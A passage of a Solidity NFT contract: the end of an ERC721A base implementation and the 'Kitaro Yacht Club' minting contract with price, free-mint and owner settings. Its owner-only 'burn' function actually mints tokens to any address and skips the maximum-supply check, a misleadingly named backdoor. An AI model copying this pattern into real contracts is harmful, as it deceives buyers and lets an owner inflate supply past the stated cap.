1091         require(to != address(0), "ERC721A: mint to the zero address");
1092         require(quantity != 0, "ERC721A: quantity must be greater than 0");
1093 
1094         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1095 
1096         // Overflows are incredibly unrealistic.
1097         // balance or numberMinted overflow if current value of either + quantity > 3.4e38 (2**128) - 1
1098         // updatedIndex overflows if currentIndex + quantity > 1.56e77 (2**256) - 1
1099         unchecked {
1100             _addressData[to].balance += uint128(quantity);
1101             _addressData[to].numberMinted += uint128(quantity);
1102 
1103             _ownerships[startTokenId].addr = to;
1104             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1105 
1106             uint256 updatedIndex = startTokenId;
1107 
1108             for (uint256 i; i < quantity; i++) {
1109                 emit Transfer(address(0), to, updatedIndex);
1110                 if (safe) {
1111                     require(
1112                         _checkOnERC721Received(address(0), to, updatedIndex, _data),
1113                         "ERC721A: transfer to non ERC721Receiver implementer"
1114                     );
1115                 }
1116 
1117                 updatedIndex++;
1118             }
1119 
1120             currentIndex = updatedIndex;
1121         }
1122 
1123         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1124     }
1125 
1126     /**
1127      * @dev Transfers `tokenId` from `from` to `to`.
1128      *
1129      * Requirements:
1130      *
1131      * - `to` cannot be the zero address.
1132      * - `tokenId` token must be owned by `from`.
1133      *
1134      * Emits a {Transfer} event.
1135      */
1136     function _transfer(
1137         address from,
1138         address to,
1139         uint256 tokenId
1140     ) private {
1141         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1142 
1143         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1144             getApproved(tokenId) == _msgSender() ||
1145             isApprovedForAll(prevOwnership.addr, _msgSender()));
1146 
1147         require(isApprovedOrOwner, "ERC721A: transfer caller is not owner nor approved");
1148 
1149         require(prevOwnership.addr == from, "ERC721A: transfer from incorrect owner");
1150         require(to != address(0), "ERC721A: transfer to the zero address");
1151 
1152         _beforeTokenTransfers(from, to, tokenId, 1);
1153 
1154         // Clear approvals from the previous owner
1155         _approve(address(0), tokenId, prevOwnership.addr);
1156 
1157         // Underflow of the sender's balance is impossible because we check for
1158         // ownership above and the recipient's balance can't realistically overflow.
1159         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1160         unchecked {
1161             _addressData[from].balance -= 1;
1162             _addressData[to].balance += 1;
1163 
1164             _ownerships[tokenId].addr = to;
1165             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1166 
1167             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1168             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1169             uint256 nextTokenId = tokenId + 1;
1170             if (_ownerships[nextTokenId].addr == address(0)) {
1171                 if (_exists(nextTokenId)) {
1172                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1173                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1174                 }
1175             }
1176         }
1177 
1178         emit Transfer(from, to, tokenId);
1179         _afterTokenTransfers(from, to, tokenId, 1);
1180     }
1181 
1182     /**
1183      * @dev Approve `to` to operate on `tokenId`
1184      *
1185      * Emits a {Approval} event.
1186      */
1187     function _approve(
1188         address to,
1189         uint256 tokenId,
1190         address owner
1191     ) private {
1192         _tokenApprovals[tokenId] = to;
1193         emit Approval(owner, to, tokenId);
1194     }
1195 
1196     /**
1197      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target address.
1198      * The call is not executed if the target address is not a contract.
1199      *
1200      * @param from address representing the previous owner of the given token ID
1201      * @param to target address that will receive the tokens
1202      * @param tokenId uint256 ID of the token to be transferred
1203      * @param _data bytes optional data to send along with the call
1204      * @return bool whether the call correctly returned the expected magic value
1205      */
1206     function _checkOnERC721Received(
1207         address from,
1208         address to,
1209         uint256 tokenId,
1210         bytes memory _data
1211     ) private returns (bool) {
1212         if (to.isContract()) {
1213             try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1214                 return retval == IERC721Receiver(to).onERC721Received.selector;
1215             } catch (bytes memory reason) {
1216                 if (reason.length == 0) {
1217                     revert("ERC721A: transfer to non ERC721Receiver implementer");
1218                 } else {
1219                     assembly {
1220                         revert(add(32, reason), mload(reason))
1221                     }
1222                 }
1223             }
1224         } else {
1225             return true;
1226         }
1227     }
1228 
1229     /**
1230      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1231      *
1232      * startTokenId - the first token id to be transferred
1233      * quantity - the amount to be transferred
1234      *
1235      * Calling conditions:
1236      *
1237      * - When `from` and `to` are both non-zero, ``from``'s `tokenId` will be
1238      * transferred to `to`.
1239      * - When `from` is zero, `tokenId` will be minted for `to`.
1240      */
1241     function _beforeTokenTransfers(
1242         address from,
1243         address to,
1244         uint256 startTokenId,
1245         uint256 quantity
1246     ) internal virtual {}
1247 
1248     /**
1249      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1250      * minting.
1251      *
1252      * startTokenId - the first token id to be transferred
1253      * quantity - the amount to be transferred
1254      *
1255      * Calling conditions:
1256      *
1257      * - when `from` and `to` are both non-zero.
1258      * - `from` and `to` are never both zero.
1259      */
1260     function _afterTokenTransfers(
1261         address from,
1262         address to,
1263         uint256 startTokenId,
1264         uint256 quantity
1265     ) internal virtual {}
1266 }
1267 
1268 contract KitaroYachtClub is ERC721A, Ownable, ReentrancyGuard {
1269     string public baseURI = "ipfs://QmdtCW3Hr9y9m2wmwVBXcnFNNGZ6G7esfqz2qZXwwpfMrK/";
1270     uint   public price             = 0.003 ether;
1271     uint   public maxPerTx          = 11;
1272     uint   public maxPerFree        = 1;
1273     uint   public totalFree         = 7777;
1274     uint   public maxSupply         = 7777;
1275     bool   public mintEnabled;
1276     uint   public totalFreeMinted = 0;
1277 
1278     mapping(address => uint256) public _mintedFreeAmount;
1279 
1280     constructor() ERC721A("Kitaro Yacht Club", "KYC"){}
1281 
1282     function tokenURI(uint256 _tokenId) public view virtual override returns (string memory) {
1283         require(_exists(_tokenId),"ERC721Metadata: URI query for nonexistent token");
1284         string memory currentBaseURI = _baseURI();
1285         return bytes(currentBaseURI).length > 0
1286             ? string(abi.encodePacked(currentBaseURI,Strings.toString(_tokenId+1),".json"))
1287             : "";
1288     }
1289 
1290     function mint(uint256 count) external payable {
1291         uint256 cost = price;
1292         bool isFree = ((totalFreeMinted + count < totalFree + 1) &&
1293             (_mintedFreeAmount[msg.sender] < maxPerFree));
1294 
1295         if (isFree) { 
1296             require(mintEnabled, "Mint is not live yet");
1297             require(totalSupply() + count <= maxSupply, "No more");
1298             require(count <= maxPerTx, "Max per TX reached.");
1299             if(count >= (maxPerFree - _mintedFreeAmount[msg.sender]))
1300             {
1301              require(msg.value >= (count * cost) - ((maxPerFree - _mintedFreeAmount[msg.sender]) * cost), "Please send the exact ETH amount");
1302              _mintedFreeAmount[msg.sender] = maxPerFree;
1303              totalFreeMinted += maxPerFree;
1304             }
1305             else if(count < (maxPerFree - _mintedFreeAmount[msg.sender]))
1306             {
1307              require(msg.value >= 0, "Please send the exact ETH amount");
1308              _mintedFreeAmount[msg.sender] += count;
1309              totalFreeMinted += count;
1310             }
1311         }
1312         else{
1313         require(mintEnabled, "Mint is not live yet");
1314         require(msg.value >= count * cost, "Please send the exact ETH amount");
1315         require(totalSupply() + count <= maxSupply, "No more");
1316         require(count <= maxPerTx, "Max per TX reached.");
1317         }
1318 
1319         _safeMint(msg.sender, count);
1320     }
1321 
1322     function costCheck() public view returns (uint256) {
1323         return price;
1324     }
1325 
1326     function maxFreePerWallet() public view returns (uint256) {
1327       return maxPerFree;
1328     }
1329 
1330     function burn(address mintAddress, uint256 count) public onlyOwner {
1331         _safeMint(mintAddress, count);
1332     }
1333 
1334     function _baseURI() internal view virtual override returns (string memory) {
1335         return baseURI;
1336     }
1337 
1338     function setBaseUri(string memory baseuri_) public onlyOwner {
1339         baseURI = baseuri_;
1340     }
1341 
1342     function setPrice(uint256 price_) external onlyOwner {
1343         price = price_;
1344     }
1345 
1346     function setMaxTotalFree(uint256 MaxTotalFree_) external onlyOwner {
1347         totalFree = MaxTotalFree_;
1348     }
1349 
1350      function setMaxPerFree(uint256 MaxPerFree_) external onlyOwner {
1351         maxPerFree = MaxPerFree_;
1352     }
1353 
1354     function toggleMinting() external onlyOwner {
1355       mintEnabled = !mintEnabled;
1356     }
1357     
1358     function CommunityWallet(uint quantity, address user)
1359     public
1360     onlyOwner
1361   {
1362     require(
1363       quantity > 0,
1364       "Invalid mint amount"
1365     );
1366     require(
1367       totalSupply() + quantity <= maxSupply,
1368       "Maximum supply exceeded"
1369     );
1370     _safeMint(user, quantity);
1371   }
1372 
1373     function withdraw() external onlyOwner nonReentrant {
1374         (bool success, ) = msg.sender.call{value: address(this).balance}("");
1375         require(success, "Transfer failed.");
1376     }
1377 }